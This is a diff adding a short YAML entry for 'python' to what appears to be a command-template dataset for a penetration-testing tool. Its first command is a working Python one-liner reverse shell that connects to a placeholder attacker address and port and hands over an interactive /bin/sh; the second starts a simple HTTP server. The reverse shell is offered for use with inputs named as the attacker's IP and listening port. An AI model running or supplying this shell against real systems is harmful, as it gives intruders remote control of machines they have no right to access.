@@ -1,0 +1,21 @@
+---
+name: python
+description: An interpreted, interactive, object-oriented programming language
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Reverse Shell (/bin/sh)":
+    - type: ["other","NX"]
+    - text: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IPV4}\",{INT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "HTTP Server":
+    - type: ["bash","standalone"]
+    - text: "python -m SimpleHTTPServer {INT}"
+    - input: ["listening TCP port"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+...
